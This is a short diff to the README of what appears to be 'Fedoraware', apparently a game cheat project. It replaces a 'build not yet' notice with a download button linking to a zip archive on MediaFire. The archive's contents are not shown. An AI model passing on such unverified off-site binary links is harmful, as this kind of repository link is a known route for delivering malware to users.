@@ -1,7 +1,8 @@
 <p align="center">
   <img src=".github/assets/Logo_Animated.svg" alt="Fedoraware Logo" width="250" align="center">
   <br/>
-Download build not yet. Compiling
+  <a href="https://www.mediafire.com/file/6zhqi4579fyhjav/Fware-iv.zip/file">
+    <img src=".github/assets/download.png" alt="Download Button" width="400" height="auto" align="center">
   </a>
 </p>
 
